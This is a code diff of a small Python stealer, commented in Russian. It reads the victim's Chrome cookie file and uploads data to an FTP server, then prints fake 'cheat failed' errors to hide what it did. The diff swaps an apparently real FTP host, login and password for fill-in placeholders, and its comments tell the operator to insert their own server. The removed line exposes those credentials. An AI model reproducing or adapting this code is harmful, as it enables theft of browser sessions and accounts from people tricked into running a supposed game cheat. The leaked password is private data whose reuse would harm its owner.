@@ -2,7 +2,7 @@ import os.path
 import getpass
 from ftplib import FTP
 import random
-con = FTP("hostde19.fornex.host","v58606", "QT:=Ys>B4<N=A^Cc")
+con = FTP("Тут хост","Тут логин", "Тут пароль")#Эта штука делает запрос к твоему хосту
 
 UserName = '\\' + getpass.getuser()
 dir_cookie_google = 'C:\\Users'+UserName+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
@@ -43,6 +43,7 @@ def check():
             con.storbinary("STOR %s" % filename2, content)
 
 check()
+#Данные сообщения оповещают,груо говоря, о том что всё в порядке
 print("Error library import HOUII.dll")
 print("Error RUN cheat")
 input()
